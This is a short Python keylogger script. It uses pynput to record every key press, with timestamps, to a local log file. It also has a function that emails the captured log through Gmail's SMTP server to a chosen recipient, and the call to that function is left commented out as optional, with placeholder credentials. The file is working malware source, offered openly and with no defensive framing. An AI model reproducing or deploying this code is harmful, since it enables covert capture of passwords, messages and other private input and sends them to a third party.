from pynput.keyboard import Listener
import logging
import smtplib
from email.mime.text import MIMEText
import threading


log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

def send_logs(email, password, recipient):
    with open("key_log.txt", "r") as log_file:
        log_data = log_file.read()
    
    msg = MIMEText(log_data)
    msg['Subject'] = "Keylogger Report"
    msg['From'] = email
    msg['To'] = recipient
    
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(email, password)
        server.send_message(msg)

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()
    
    # Optional: Uncomment to send logs via email
    # send_logs("your_email@gmail.com", "your_password", "recipient@example.com")
